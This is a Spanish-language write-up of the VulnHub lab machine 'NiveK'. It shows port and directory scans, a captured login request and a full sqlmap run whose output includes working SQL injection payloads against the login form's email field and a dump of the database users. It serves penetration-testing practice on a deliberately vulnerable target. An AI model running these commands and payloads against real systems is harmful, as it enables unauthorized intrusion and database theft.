---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# NiveK VulnHub

### Escaneo de puertos

```shell
nmap -p- --min-rate 5000 -sV <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 03:42 EDT
Nmap scan report for 192.168.195.143
Host is up (0.00062s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.195.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:fc:ed:dc:9b:b3:24:ff:2e:c3:51:f8:33:20:78:40 (RSA)
|   256 91:5e:81:68:73:68:65:ec:a2:de:27:19:c6:82:86:a9 (ECDSA)
|_  256 a7:eb:f6:a2:c6:63:54:e1:f5:18:53:fc:c3:e1:b2:28 (ED25519)
7080/tcp open  http    Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/7.3.29 mod_perl/2.0.11 Perl/v5.32.1)
| http-title: Admin Panel
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/7.3.29 mod_perl/2.0.11 Perl/v5.32.1
MAC Address: 00:0C:29:D8:BA:92 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.9 (97%), Linux 4.4 (97%), Linux 3.13 (94%), Linux 3.13 - 3.16 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Linux 5.1 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 192.168.195.143

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds
```

### Gobuster

```shell
gobuster dir -u http://<IP>:7080/ -w <WORDLIST> -x php,html,txt -t 50 -r -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.195.143:7080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.php        (Status: 403) [Size: 1024]
/.htaccess            (Status: 403) [Size: 1024]
/.htaccess.txt        (Status: 403) [Size: 1024]
/.htpasswd.txt        (Status: 403) [Size: 1024]
/.htpasswd            (Status: 403) [Size: 1024]
/.htaccess.html       (Status: 403) [Size: 1024]
/.htpasswd.html       (Status: 403) [Size: 1024]
/.htaccess.php        (Status: 403) [Size: 1024]
/appointment.php      (Status: 200) [Size: 4087]
/cgi-bin/             (Status: 403) [Size: 1038]
/cgi-bin/.html        (Status: 403) [Size: 1024]
/changepassword.php   (Status: 200) [Size: 4087]
/connect.php          (Status: 200) [Size: 1]
/department.php       (Status: 200) [Size: 4087]
/doctor.php           (Status: 200) [Size: 4087]
/files                (Status: 200) [Size: 1103]
/footer.php           (Status: 200) [Size: 1783]
/forgot_password.php  (Status: 200) [Size: 5614]
/head.php             (Status: 200) [Size: 1741]
/header.php           (Status: 200) [Size: 4924]
/index.php            (Status: 200) [Size: 4087]
/login.php            (Status: 200) [Size: 4087]
/logout.php           (Status: 200) [Size: 48]
/medicine.php         (Status: 200) [Size: 4087]
/pages                (Status: 200) [Size: 890]
/phpmyadmin           (Status: 403) [Size: 1193]
/patient.php          (Status: 200) [Size: 4087]
/profile.php          (Status: 200) [Size: 4087]
/sidebar.php          (Status: 200) [Size: 2238]
/setting.php          (Status: 200) [Size: 4087]
/signup.php           (Status: 200) [Size: 6514]
/test.php             (Status: 200) [Size: 6]
/treatment.php        (Status: 200) [Size: 4087]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Si hacemos una captura de peticion con BurpSuit en el panel de login e inyectamos codigos de SQL Injection, veremos que funciona en el campo de `email`, si hacemos un `sqlmap` vemos que el parametro injectable es el de `user`, por lo que haremos lo siguiente, nos guardamos el `request.txt` de la caputa de peticion de BurpSuit en un archivo `.txt`...

!\[\[Pasted image 20240524122010.png]]

El archivo `request.txt` se tiene que ver algo tal que asi...

```
POST /login.php HTTP/1.1

Host: 192.168.195.143:7080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 54

Origin: http://192.168.195.143:7080

Connection: close

Referer: http://192.168.195.143:7080/login.php

Cookie: PHPSESSID=13f8bfdc294106e0e83a0ec41bbadf19

Upgrade-Insecure-Requests: 1



user=admin&email=test@gmail.com&password=aa&btn_login=
```

```shell
sqlmap -r request.txt --dbms=mysql --dbs --users --risk=3 --level=5
```

Info:

```
        ___
       __H__                                                                                                                                        
 ___ ___[(]_____ ___ ___  {1.7.11#stable}                                                                                                           
|_ -| . ["]     | .'| . |                                                                                                                           
|___|_  [']_|_|_|__,|  _|                                                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:40:36 /2024-05-24/

[06:40:36] [INFO] parsing HTTP request from 'hms.sql'
[06:40:37] [WARNING] provided value for parameter 'btn_login' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[06:40:37] [INFO] testing connection to the target URL
[06:40:37] [INFO] testing if the target URL content is stable
[06:40:37] [INFO] target URL content is stable
[06:40:37] [INFO] testing if POST parameter 'user' is dynamic
[06:40:38] [WARNING] POST parameter 'user' does not appear to be dynamic
[06:40:38] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')
[06:40:38] [INFO] testing for SQL injection on POST parameter 'user'
[06:40:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:40:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:40:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:40:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:40:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[06:40:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[06:40:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[06:40:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[06:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[06:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[06:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[06:40:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[06:40:44] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[06:40:44] [INFO] testing 'Generic inline queries'
[06:40:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[06:40:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[06:40:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[06:40:46] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[06:40:47] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[06:40:48] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[06:40:48] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[06:40:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[06:40:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[06:40:51] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[06:40:52] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[06:40:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[06:40:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[06:40:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[06:40:52] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[06:40:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[06:40:53] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[06:40:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[06:40:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[06:40:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[06:40:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[06:40:55] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[06:40:56] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[06:40:56] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[06:40:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[06:40:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:40:58] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:40:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:40:59] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:41:00] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:41:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[06:41:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:41:02] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[06:41:02] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[06:41:02] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[06:41:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[06:41:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[06:41:03] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[06:41:03] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[06:41:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[06:41:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[06:41:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[06:41:03] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[06:41:03] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[06:41:03] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[06:41:03] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[06:41:03] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[06:41:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[06:41:03] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[06:41:03] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[06:41:03] [INFO] testing 'MySQL inline queries'
[06:41:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[06:41:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[06:41:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[06:41:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[06:41:04] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[06:41:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[06:41:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[06:41:06] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[06:41:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[06:41:07] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[06:41:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[06:41:08] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[06:41:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[06:41:08] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[06:41:09] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[06:41:09] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[06:41:10] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[06:41:10] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[06:41:11] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[06:41:11] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[06:41:11] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[06:41:12] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[06:41:12] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[06:41:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[06:41:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[06:41:14] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[06:41:14] [INFO] testing 'MySQL AND time-based blind (ELT)'
[06:41:15] [INFO] testing 'MySQL OR time-based blind (ELT)'
[06:41:15] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[06:41:15] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[06:41:16] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[06:41:16] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[06:41:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[06:41:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[06:41:16] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[06:41:16] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[06:41:16] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[06:41:16] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[06:41:16] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[06:41:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[06:41:16] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[06:41:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[06:41:20] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[06:41:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[06:41:21] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[06:41:21] [WARNING] POST parameter 'user' does not seem to be injectable
[06:41:21] [INFO] testing if POST parameter 'email' is dynamic
[06:41:21] [WARNING] POST parameter 'email' does not appear to be dynamic
[06:41:21] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
[06:41:21] [INFO] testing for SQL injection on POST parameter 'email'
[06:41:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:41:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[06:41:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[06:41:23] [INFO] POST parameter 'email' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --not-string="Login")
[06:41:23] [INFO] testing 'Generic inline queries'
[06:41:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[06:41:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[06:41:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[06:41:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[06:41:23] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[06:41:23] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[06:41:23] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[06:41:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[06:41:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:41:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[06:41:24] [INFO] POST parameter 'email' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[06:41:24] [INFO] testing 'MySQL inline queries'
[06:41:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[06:41:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[06:41:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[06:41:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[06:41:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[06:41:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[06:41:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[06:41:34] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[06:41:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:41:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[06:41:34] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[06:41:34] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[06:41:34] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[06:41:34] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[06:41:35] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[06:41:35] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[06:41:35] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[06:41:35] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[06:41:36] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[06:41:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[06:41:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[06:41:36] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[06:41:36] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[06:41:36] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[06:41:37] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[06:41:37] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[06:41:37] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[06:41:37] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[06:41:37] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[06:41:38] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 4254 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=admin&email=test@gmail.com' OR NOT 8870=8870-- NmEY&password=aa&btn_login=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=admin&email=test@gmail.com' OR (SELECT 7125 FROM(SELECT COUNT(*),CONCAT(0x7162717671,(SELECT (ELT(7125=7125,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- idzu&password=aa&btn_login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=admin&email=test@gmail.com' AND (SELECT 5999 FROM (SELECT(SLEEP(5)))dtkH)-- MpGo&password=aa&btn_login=
---
[06:41:42] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.48, PHP 7.3.29
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[06:41:42] [INFO] fetching database users
[06:41:42] [INFO] retrieved: '''@'localhost''
[06:41:42] [INFO] retrieved: ''pma'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'localhost''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:43] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'::1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
[06:41:44] [INFO] retrieved: ''root'@'127.0.0.1''
